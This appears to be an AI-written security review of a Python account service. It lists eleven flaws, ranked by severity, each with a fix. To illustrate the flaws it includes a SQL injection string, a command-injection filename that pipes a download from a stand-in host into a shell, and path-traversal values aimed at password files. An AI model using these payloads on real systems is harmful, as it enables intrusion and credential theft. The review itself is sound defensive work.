@@ -1,0 +1,55 @@
+I found 11 issues in `account_service.py`, listed from most to least severe. This comes from reading the code only; I didn't run anything.
+
+### Critical
+
+**1. SQL injection — line 34**
+`find_by_username` puts `username` straight into the SQL string with an f-string. A username like `' OR '1'='1' --` returns the first user. Because `verify_credentials` (line 55) calls this function, the login path itself is injectable. An attacker can also use `UNION SELECT` to read any table. **Fix:** use a parameterized query (`WHERE username = ?`), as `find_by_id` already does.
+
+**2. Command injection — lines 120–122**
+`filename` goes into a shell command run with `shell=True`. A filename like `x; curl evil.sh | sh` runs arbitrary commands on the server. **Fix:** pass an argument list (`["python3", "tools/export.py", "--user", str(user_id), ...]`) without `shell=True`, and generate the filename on the server.
+
+**3. Path traversal / arbitrary file read — lines 119 and 126**
+`os.path.join(EXPORT_DIR, filename)` doesn't contain the path:
+- `../../etc/passwd` walks out of `/var/exports`.
+- An absolute path like `/etc/shadow` makes `join` drop `EXPORT_DIR` entirely.
+
+Line 126 then reads that file and returns its bytes. Since `check=False` (line 124), the export can fail and the function still returns whatever file the path points to. It's also an arbitrary file write, via `--out`. **Fix:** generate the filename on the server (e.g. a UUID), resolve the path, and confirm it is still under `EXPORT_DIR`.
+
+**4. Missing authorization (IDOR) on profile updates — lines 83–96**
+`session_user_id` is never used, so any logged-in user can update any account. Changing someone's `email` to the attacker's address and then triggering a password reset gives full account takeover. **Fix:** require `session_user_id == target_user_id` or an admin role, as `deactivate_account` does.
+
+### High
+
+**5. Plaintext password logged — lines 60–65**
+Every successful login writes the user's password to the logs. Anyone with log access (log aggregation, backups, support staff) gets valid credentials. **Fix:** remove `password` from the log call.
+
+**6. Hard-coded live secret — line 19**
+`SIGNING_KEY = "sk_live_..."` is in source code, so it ends up in version control, builds and anyone's checkout. **Fix:** load it from a secrets manager or environment variable, and rotate it now because it has been exposed.
+
+**7. Weak password hashing — line 75**
+Passwords are hashed with one round of SHA-256, a global pepper and no per-user salt:
+- It's fast, so leaked hashes can be brute-forced.
+- Identical passwords produce identical hashes.
+- The pepper is the hard-coded key from #6, so rotating that key invalidates every stored password.
+
+**Fix:** use argon2id or bcrypt, which add a per-user salt.
+
+**8. Missing authorization (IDOR) on profile reads — lines 103–112**
+`session_user_id` is ignored here too, so anyone can read any user's email, display name and role. **Fix:** add an ownership or admin check.
+
+**9. Missing authorization on data export — line 117**
+Nothing checks that the caller owns `user_id`, so anyone can export another user's data. All exports also go into one shared directory under names the caller chooses. Users can therefore guess or collide with each other's files. A failed export can also return a stale file left by someone else's earlier export. **Fix:** pass the session user and check it against `user_id`. Use unique server-generated filenames, check the subprocess result, and delete the file after reading it.
+
+### Medium / Low
+
+**10. Timing side channels — lines 56 and 59**
+- **Line 59:** the hash comparison with `==` takes slightly different time depending on the input. Use `hmac.compare_digest`.
+- **Line 56:** when the username doesn't exist, the function returns before hashing anything. That makes failed logins faster for unknown usernames, which lets an attacker find out which usernames exist. Hash a dummy value in that case so both paths take the same time.
+
+**11. Signup listing has no auth and no lower bound — lines 130–134**
+`list_recent_signups` makes no authorization check. Line 132 only caps the upper bound, and SQLite treats a negative `LIMIT` (e.g. `-1`) as "no limit", so callers can bypass the 1000-row cap. **Fix:** clamp to `1 <= limit <= 1000`, validate `days`, and restrict the function to admins.
+
+### Minor notes
+- **Lines 155–165:** `deactivate_account` doesn't check whether the acting user is still active. A deactivated admin keeps admin powers, at least within this module. It also returns `True` even when the target doesn't exist.
+- **Line 150:** the email regex can backtrack heavily on very long crafted input. Cap the input length before matching.
+- **Line 5:** the docstring says callers have passed the session middleware. Logging in doesn't mean being allowed to act on other accounts, though. Several functions accept a `session_user_id` and never use it (#4, #8), and others have no session parameter at all (#9, #11).
